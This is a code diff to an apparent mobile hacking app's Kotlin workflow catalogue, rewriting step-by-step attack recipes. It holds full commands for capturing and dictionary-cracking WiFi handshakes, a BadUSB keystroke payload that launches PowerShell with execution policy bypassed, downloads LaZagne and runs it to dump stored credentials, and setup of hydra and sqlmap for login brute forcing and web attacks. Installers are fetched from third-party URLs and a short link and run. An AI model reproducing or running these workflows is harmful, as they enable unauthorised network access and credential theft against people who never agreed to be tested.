@@ -302,13 +302,14 @@ object WorkflowRepository {
                 WorkflowStep(
                     stepNumber = 1,
                     title = "One-Time Setup: Install Cracking Tools in Termux",
-                    description = "Do this once before your first capture. Open Termux and run these commands one at a time. Fish shell uses the same commands — just type them exactly.",
+                    description = "Do this once before your first capture. hcxtools and aircrack-ng were REMOVED from the Termux package repo, so `pkg install` no longer finds them — we build hcxtools from source and install aircrack-ng from a prebuilt .deb. Run each command in order. Fish shell uses the same commands.",
                     commands = listOf(
                         Command("Update packages", "pkg update -y && pkg upgrade -y", Device.TERMUX),
-                        Command("Install tools", "pkg install -y hashcat hcxtools", Device.TERMUX),
+                        Command("Build hcxtools from source", "pkg install -y git clang make openssl libcurl zlib pkg-config && cd ~ && rm -rf hcxtools && git clone https://github.com/ZerBea/hcxtools && cd hcxtools && make && make install PREFIX=\$PREFIX && cd ~ && hcxpcapngtool --version", Device.TERMUX),
+                        Command("Install aircrack-ng (.deb)", "pkg install -y libnl libpcap libsqlite pcre zlib dpkg wget && cd ~ && wget -O aircrack.deb https://raw.githubusercontent.com/pitube08642/aircrack-ng-for-termux/main/dists/termux/aircrack-ng/binary-aarch64/aircrack-ng_3_1.7_aarch64.deb && dpkg -i aircrack.deb && aircrack-ng --help | head -1", Device.TERMUX),
                         Command("Get wordlist", "curl -L -o ~/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", Device.TERMUX)
                     ),
-                    tips = listOf("rockyou.txt download is ~130MB — use WiFi", "Only need to do this step once ever")
+                    tips = listOf("hcxtools builds in under a minute — you'll see 'hcxpcapngtool 7.x' when done", "rockyou.txt download is ~130MB — use WiFi", "Only need to do this step once ever", "hashcat is NOT installable on unrooted Termux (no OpenCL) — use aircrack-ng here, or Kali NetHunter for hashcat")
                 ),
                 WorkflowStep(
                     stepNumber = 2,
@@ -335,34 +336,29 @@ object WorkflowRepository {
                 ),
                 WorkflowStep(
                     stepNumber = 5,
-                    title = "Convert the Capture File in Termux",
-                    description = "Open Termux. Navigate to your Downloads folder and convert the .pcap to hashcat format. Replace 'capture.pcap' with your actual filename.",
+                    title = "Check the Capture File in Termux",
+                    description = "Open Termux and confirm your .pcap is there. aircrack-ng reads the .pcap directly, so no conversion is needed. (Optional: the hcxpcapngtool convert command is only needed if you plan to crack with hashcat inside NetHunter.)",
                     commands = listOf(
                         Command("Go to Downloads", "cd /sdcard/Download", Device.TERMUX),
                         Command("List files", "ls *.pcap", Device.TERMUX),
-                        Command("Convert", "hcxpcapngtool -o hash.hc22000 capture.pcap", Device.TERMUX),
-                        Command("Check output", "ls -la hash.hc22000", Device.TERMUX)
+                        Command("Optional: convert for hashcat", "hcxpcapngtool -o hash.hc22000 capture.pcap", Device.TERMUX)
                     ),
-                    tips = listOf("If hc22000 file is 0 bytes: the pcap had no PMKID data — try a different capture", "Fish shell tip: use Tab to autocomplete filenames")
+                    tips = listOf("Replace capture.pcap with your actual filename", "For the aircrack-ng crack in the next step you can skip the convert command entirely", "Fish shell tip: use Tab to autocomplete filenames")
                 ),
                 WorkflowStep(
                     stepNumber = 6,
                     title = "Crack the Password in Termux",
-                    description = "Run hashcat on your phone. It uses CPU-only on unrooted Android — slower than a GPU but still cracks most common passwords in minutes to hours.",
+                    description = "Use aircrack-ng — it runs CPU-only and reads the .pcap directly, so it works on unrooted Android where hashcat can't (hashcat needs OpenCL, which unrooted Termux lacks). It auto-detects the handshake/PMKID and dictionary-attacks it.",
                     commands = listOf(
-                        Command("Crack", "hashcat -m 22000 hash.hc22000 ~/rockyou.txt -D 1", Device.TERMUX),
-                        Command("Show cracked", "hashcat -m 22000 hash.hc22000 --show", Device.TERMUX)
+                        Command("Crack with aircrack-ng", "aircrack-ng -w ~/rockyou.txt /sdcard/Download/capture.pcap", Device.TERMUX)
                     ),
-                    tips = listOf("-D 1 forces CPU mode (required on unrooted)", "Progress shown live — Ctrl+C to pause, resume later by re-running same command", "Common passwords crack in seconds, complex ones take longer")
+                    tips = listOf("Replace capture.pcap with your actual filename", "If it lists several networks, type the number of your target and press Enter", "Password prints as 'KEY FOUND! [ password ]'", "Want hashcat's speed/rules instead? Install Kali NetHunter (Tools workflow) — hashcat works fully inside the Kali chroot")
                 ),
                 WorkflowStep(
                     stepNumber = 7,
                     title = "Read the Password",
-                    description = "When hashcat finds the password it prints: [network name]:[password]. Run the --show command to display all cracked passwords from this session.",
-                    commands = listOf(
-                        Command("Show result", "hashcat -m 22000 hash.hc22000 --show", Device.TERMUX)
-                    ),
-                    tips = listOf("Password appears after the colon in the output", "Results are also saved in ~/.hashcat/hashcat.potfile — check there if --show shows nothing")
+                    description = "When aircrack-ng finds the password it stops and prints a big 'KEY FOUND! [ yourpassword ]' banner in the middle of the screen. That's the WiFi password.",
+                    tips = listOf("The password is inside the square brackets on the KEY FOUND line", "If it says 'Passphrase not in dictionary', the password isn't in rockyou.txt — try a bigger wordlist", "To save the result: add  | tee ~/cracked.txt  to the end of the crack command")
                 )
             )
         ),
@@ -373,7 +369,7 @@ object WorkflowRepository {
             subtitle = "Force a reconnect to grab the 4-way handshake, crack in Termux",
             categoryId = "wifi",
             hardware = listOf(Hardware.AWOK, Hardware.PHONE),
-            prerequisites = listOf("AWOK Dual Mini v3 with Marauder", "MicroSD card", "Termux with hashcat installed", "At least one device connected to the target network"),
+            prerequisites = listOf("AWOK Dual Mini v3 with Marauder", "MicroSD card", "Termux with aircrack-ng installed (see Termux Setup workflow)", "At least one device connected to the target network"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
@@ -411,34 +407,20 @@ object WorkflowRepository {
                 ),
                 WorkflowStep(
                     stepNumber = 6,
-                    title = "Convert in Termux",
-                    description = "Open Termux. Convert the pcap to hashcat format.",
+                    title = "Crack in Termux with aircrack-ng",
+                    description = "Open Termux. aircrack-ng reads the handshake .pcap directly and dictionary-attacks it — no conversion needed, and it runs CPU-only so it works on unrooted Android (unlike hashcat, which needs OpenCL).",
                     commands = listOf(
                         Command("Go to Downloads", "cd /sdcard/Download", Device.TERMUX),
-                        Command("Convert", "hcxpcapngtool -o hash.hc22000 handshake.pcap", Device.TERMUX),
-                        Command("Verify", "wc -l hash.hc22000", Device.TERMUX)
+                        Command("List captures", "ls *.pcap", Device.TERMUX),
+                        Command("Crack", "aircrack-ng -w ~/rockyou.txt handshake.pcap", Device.TERMUX)
                     ),
-                    tips = listOf("wc -l should return 1 or more — if 0 the capture was incomplete, try again")
+                    tips = listOf("Replace handshake.pcap with your actual filename", "If it lists multiple networks, type the target's number and press Enter", "If it says 'no valid WPA handshakes' the capture was incomplete — re-capture")
                 ),
                 WorkflowStep(
                     stepNumber = 7,
-                    title = "Crack in Termux",
-                    description = "Run hashcat with the wordlist. The -D 1 flag is required for CPU-only mode on unrooted Android.",
-                    commands = listOf(
-                        Command("Crack", "hashcat -m 22000 hash.hc22000 ~/rockyou.txt -D 1", Device.TERMUX),
-                        Command("With rules (more coverage)", "hashcat -m 22000 hash.hc22000 ~/rockyou.txt -D 1 -r /data/data/com.termux/files/usr/share/hashcat/rules/best64.rule", Device.TERMUX),
-                        Command("Show cracked", "hashcat -m 22000 hash.hc22000 --show", Device.TERMUX)
-                    ),
-                    tips = listOf("Rules mutation adds numbers/symbols to every word — catches 'password1', 'letmein!' etc", "Let it run in background: hashcat ... & (fish: run it in a new Termux session)")
-                ),
-                WorkflowStep(
-                    stepNumber = 8,
                     title = "Get the Password",
-                    description = "Cracked password appears as: [SSID]:[password]. Copy it from the terminal output.",
-                    commands = listOf(
-                        Command("Show result", "hashcat -m 22000 hash.hc22000 --show", Device.TERMUX),
-                        Command("Check potfile", "cat ~/.hashcat/hashcat.potfile", Device.TERMUX)
-                    )
+                    description = "aircrack-ng stops and prints a large 'KEY FOUND! [ password ]' banner. The text inside the brackets is the WiFi password.",
+                    tips = listOf("Save it: re-run the crack adding  | tee ~/cracked.txt", "Not in rockyou.txt? Try a larger wordlist, or convert with hcxpcapngtool and run hashcat + rules inside Kali NetHunter for far more coverage")
                 )
             )
         ),
@@ -1222,7 +1204,7 @@ object WorkflowRepository {
                 WorkflowStep(
                     stepNumber = 2,
                     title = "Download LaZagne Payload",
-                    description = "LaZagne is the go-to credential dumping tool. The BadUSB payload opens PowerShell and downloads + runs it in memory:\n\nGUI r → STRING powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/AlessandroZ/LaZagne/master/Windows/laZagne.exe')\" → ENTER",
+                    description = "LaZagne is the go-to credential dumping tool. The BadUSB payload opens PowerShell, downloads the official release build to a temp file, and runs it:\n\nGUI r → STRING powershell -ep bypass -c \"iwr https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -OutFile \$env:TEMP\\lz.exe; & \$env:TEMP\\lz.exe all\" → ENTER",
                     tips = listOf("Or use a hosted copy on your own server so you don't depend on GitHub being up")
                 ),
                 WorkflowStep(
@@ -1780,8 +1762,8 @@ object WorkflowRepository {
                     stepNumber = 1,
                     title = "Install NetHunter Rootless",
                     description = "NetHunter Rootless runs Kali in a container inside Termux — no rooting required. Open Termux and run the installer command.",
-                    commands = listOf(Command("Install", "curl -f https://kali.download/nethunter-rootless/current/kalifs-arm64.tar.xz | tar xJ", Device.TERMUX)),
-                    tips = listOf("Download is ~1GB — use WiFi", "Works on Samsung Galaxy Note 10+ without root")
+                    commands = listOf(Command("Install", "pkg install -y wget && wget -O install-nethunter-termux https://offs.ec/2MceZWr && chmod +x install-nethunter-termux && ./install-nethunter-termux", Device.TERMUX)),
+                    tips = listOf("Download is ~1GB — use WiFi", "Works on Samsung Galaxy Note 10+ without root", "This runs Kali's official rootless installer, which auto-detects arm64 and pulls the correct rootfs")
                 ),
                 WorkflowStep(
                     stepNumber = 2,
@@ -1804,55 +1786,52 @@ object WorkflowRepository {
 
         Workflow(
             id = "tools_hashcat",
-            title = "Crack Hashes with Hashcat in Termux",
-            subtitle = "Crack WiFi passwords and other hashes on your unrooted phone",
+            title = "Crack Hashes with Hashcat (via NetHunter)",
+            subtitle = "hashcat needs OpenCL — run it inside Kali NetHunter, not bare Termux",
             categoryId = "tools",
             hardware = listOf(Hardware.PHONE),
-            prerequisites = listOf("Termux with hashcat installed (see Termux Setup workflow)", "rockyou.txt in home folder", "Hash file to crack"),
+            prerequisites = listOf("Kali NetHunter Rootless installed (see the NetHunter workflow)", "rockyou.txt in home folder", "Hash file to crack"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Crack WPA2 (from AWOK capture)",
-                    description = "This is the main use case — crack a .pcap capture from AWOK. First convert it, then crack it. Both commands run in Termux on your unrooted Note 10+.",
-                    commands = listOf(
-                        Command("Convert pcap", "hcxpcapngtool -o hash.hc22000 /sdcard/Download/capture.pcap", Device.TERMUX),
-                        Command("Crack WPA2", "hashcat -m 22000 hash.hc22000 ~/rockyou.txt -D 1", Device.TERMUX),
-                        Command("Show password", "hashcat -m 22000 hash.hc22000 --show", Device.TERMUX)
-                    ),
-                    tips = listOf("-D 1 = CPU mode, required on unrooted Android", "Change capture.pcap to your actual filename")
+                    title = "Why NetHunter and Not Bare Termux",
+                    description = "hashcat requires an OpenCL runtime. Unrooted Termux has none, and hashcat was removed from Termux's repos anyway — so `pkg install hashcat` fails and even a source build won't run. Kali NetHunter ships hashcat plus pocl (a CPU OpenCL driver), so hashcat actually runs there. For a quick WPA crack without NetHunter, use the aircrack-ng method in the WiFi workflows instead.",
+                    warning = "Do not expect `pkg install hashcat` to work — it is gone from Termux. Use NetHunter.",
+                    tips = listOf("aircrack-ng (native Termux) is enough for rockyou-style WPA cracking", "Use hashcat/NetHunter when you need rules, masks, or non-WPA hash types")
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Add Rules for Complex Passwords",
-                    description = "If rockyou alone doesn't crack it, use mutation rules. Rules take each word and try variations: Password1, p@ssword, PASSWORD!, etc.",
+                    title = "Enter Kali and Install hashcat",
+                    description = "Launch the Kali chroot, then install hashcat from Kali's own repos (where it still exists).",
                     commands = listOf(
-                        Command("With best64 rules", "hashcat -m 22000 hash.hc22000 ~/rockyou.txt -D 1 -r /data/data/com.termux/files/usr/share/hashcat/rules/best64.rule", Device.TERMUX),
-                        Command("Brute force 8-char", "hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d -D 1", Device.TERMUX)
+                        Command("Enter Kali", "nh", Device.TERMUX),
+                        Command("Install hashcat + pocl", "apt update && apt install -y hashcat pocl-opencl-icd hcxtools", Device.TERMUX)
                     ),
-                    tips = listOf("?d = digit. Use for routers with 8-digit default passwords", "?l = lowercase, ?u = uppercase, ?s = symbol, ?a = all")
+                    tips = listOf("Everything below runs INSIDE the Kali shell you get after typing nh", "pocl-opencl-icd gives hashcat a CPU device so -D 1 works")
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Crack Other Hash Types in Termux",
-                    description = "Hashcat handles all common hash types — change the -m number.",
+                    title = "Crack WPA2 (from AWOK capture)",
+                    description = "Inside Kali: convert the .pcap to hashcat format, then crack it.",
+                    commands = listOf(
+                        Command("Convert pcap", "hcxpcapngtool -o hash.hc22000 /sdcard/Download/capture.pcap", Device.TERMUX),
+                        Command("Crack WPA2", "hashcat -m 22000 hash.hc22000 ~/rockyou.txt -D 1", Device.TERMUX),
+                        Command("With best64 rules", "hashcat -m 22000 hash.hc22000 ~/rockyou.txt -D 1 -r /usr/share/hashcat/rules/best64.rule", Device.TERMUX),
+                        Command("Show password", "hashcat -m 22000 hash.hc22000 --show", Device.TERMUX)
+                    ),
+                    tips = listOf("-D 1 = CPU mode", "Change capture.pcap to your actual filename", "Inside Kali the rules live at /usr/share/hashcat/rules/")
+                ),
+                WorkflowStep(
+                    stepNumber = 4,
+                    title = "Crack Other Hash Types",
+                    description = "hashcat handles all common hash types — change the -m number.",
                     commands = listOf(
                         Command("NTLM (Windows)", "hashcat -m 1000 hash.txt ~/rockyou.txt -D 1", Device.TERMUX),
                         Command("MD5", "hashcat -m 0 hash.txt ~/rockyou.txt -D 1", Device.TERMUX),
                         Command("SHA-256", "hashcat -m 1400 hash.txt ~/rockyou.txt -D 1", Device.TERMUX),
-                        Command("bcrypt", "hashcat -m 3200 hash.txt ~/rockyou.txt -D 1", Device.TERMUX)
+                        Command("Show all cracked", "hashcat -m 22000 hash.hc22000 --show", Device.TERMUX)
                     ),
-                    tips = listOf("bcrypt is slow — even on a GPU. On phone CPU expect hours per hash")
-                ),
-                WorkflowStep(
-                    stepNumber = 4,
-                    title = "Check Your Results",
-                    description = "Cracked passwords are saved in hashcat's potfile. Check it anytime — even if you close Termux and come back later.",
-                    commands = listOf(
-                        Command("Show all cracked", "hashcat -m 22000 hash.hc22000 --show", Device.TERMUX),
-                        Command("Check potfile", "cat ~/.hashcat/hashcat.potfile", Device.TERMUX),
-                        Command("Restore session", "hashcat --restore", Device.TERMUX)
-                    ),
-                    tips = listOf("Potfile remembers every hash you've ever cracked", "hashcat --restore continues a session that was interrupted")
+                    tips = listOf("bcrypt (-m 3200) is very slow on phone CPU — expect hours per hash", "Cracked results are saved in ~/.local/share/hashcat/hashcat.potfile inside Kali")
                 )
             )
         ),
@@ -1909,13 +1888,12 @@ object WorkflowRepository {
                 WorkflowStep(
                     stepNumber = 6,
                     title = "Install WiFi Cracking Tools",
-                    description = "Install hashcat (password cracker) and hcxtools (converts pcap captures to crackable format). These are the two tools you need for WiFi password cracking.",
+                    description = "The old `pkg install hashcat hcxtools` no longer works — Termux removed these from its repos. Instead: build hcxtools from source (for converting/cleaning captures) and install aircrack-ng from a .deb (the actual cracker that runs on unrooted Android). hashcat itself needs OpenCL, which unrooted Termux doesn't have — use Kali NetHunter if you specifically want hashcat.",
                     commands = listOf(
-                        Command("Install cracking tools", "pkg install -y hashcat hcxtools", Device.TERMUX),
-                        Command("Verify hashcat", "hashcat --version", Device.TERMUX),
-                        Command("Verify hcxtools", "hcxpcapngtool --version", Device.TERMUX)
+                        Command("Build hcxtools", "pkg install -y git clang make openssl libcurl zlib pkg-config && cd ~ && rm -rf hcxtools && git clone https://github.com/ZerBea/hcxtools && cd hcxtools && make && make install PREFIX=\$PREFIX && cd ~ && hcxpcapngtool --version", Device.TERMUX),
+                        Command("Install aircrack-ng", "pkg install -y libnl libpcap libsqlite pcre zlib dpkg wget && cd ~ && wget -O aircrack.deb https://raw.githubusercontent.com/pitube08642/aircrack-ng-for-termux/main/dists/termux/aircrack-ng/binary-aarch64/aircrack-ng_3_1.7_aarch64.deb && dpkg -i aircrack.deb && aircrack-ng --help | head -1", Device.TERMUX)
                     ),
-                    tips = listOf("If hcxtools not found: pkg install -y root-repo && pkg install -y hcxtools", "hashcat on unrooted = CPU mode only, still cracks common passwords")
+                    tips = listOf("Crack with: aircrack-ng -w ~/rockyou.txt capture.pcap", "hcxtools gives you hcxpcapngtool to convert captures to hashcat's .hc22000 format for later use in NetHunter", "For hashcat's speed + rules, install Kali NetHunter (next Tools workflow) — hashcat works fully inside the Kali chroot")
                 ),
                 WorkflowStep(
                     stepNumber = 7,
@@ -1933,9 +1911,10 @@ object WorkflowRepository {
                     description = "Tools for scanning networks, finding devices, and brute-forcing logins.",
                     commands = listOf(
                         Command("Core network tools", "pkg install -y nmap netcat-openbsd curl wget git python", Device.TERMUX),
-                        Command("Login brute force", "pkg install -y hydra", Device.TERMUX),
-                        Command("Web vuln scanner", "pkg install -y python && pip install sqlmap", Device.TERMUX)
-                    )
+                        Command("Login brute force (build hydra)", "pkg install -y git clang make openssl libssh && cd ~ && rm -rf thc-hydra && git clone https://github.com/vanhauser-thc/thc-hydra && cd thc-hydra && ./configure && make && cp hydra \$PREFIX/bin/ && cd ~ && hydra -h | head -1", Device.TERMUX),
+                        Command("Web vuln scanner", "pip install sqlmap", Device.TERMUX)
+                    ),
+                    tips = listOf("hydra was removed from Termux repos — this builds it from source (takes ~1 min)", "sqlmap installs cleanly from pip, no repo needed")
                 ),
                 WorkflowStep(
                     stepNumber = 9,
@@ -1963,13 +1942,14 @@ object WorkflowRepository {
                     title = "Test Everything Works",
                     description = "Quick verification that your setup is complete.",
                     commands = listOf(
-                        Command("Check hashcat", "hashcat --version", Device.TERMUX),
+                        Command("Check aircrack-ng", "aircrack-ng --help | head -1", Device.TERMUX),
                         Command("Check hcxtools", "hcxpcapngtool --version", Device.TERMUX),
+                        Command("Check hydra", "hydra -h | head -1", Device.TERMUX),
                         Command("Check wordlist", "wc -l ~/rockyou.txt", Device.TERMUX),
                         Command("Check nmap", "nmap --version", Device.TERMUX),
                         Command("Check storage", "ls /sdcard/Download", Device.TERMUX)
                     ),
-                    tips = listOf("rockyou.txt line count should be ~14,344,392", "If any command not found — re-run the install step for that tool")
+                    tips = listOf("rockyou.txt line count should be ~14,344,392", "If any command not found — re-run the install step for that tool", "hashcat is intentionally not here — it only runs inside Kali NetHunter")
                 )
             )
         ),
@@ -2031,7 +2011,7 @@ object WorkflowRepository {
             subtitle = "Attack SSH, FTP, HTTP, RDP, and other login services",
             categoryId = "tools",
             hardware = listOf(Hardware.PHONE),
-            prerequisites = listOf("Termux with hydra installed", "Target service identified via nmap"),
+            prerequisites = listOf("Termux with hydra built from source (see Termux Setup workflow)", "Target service identified via nmap"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
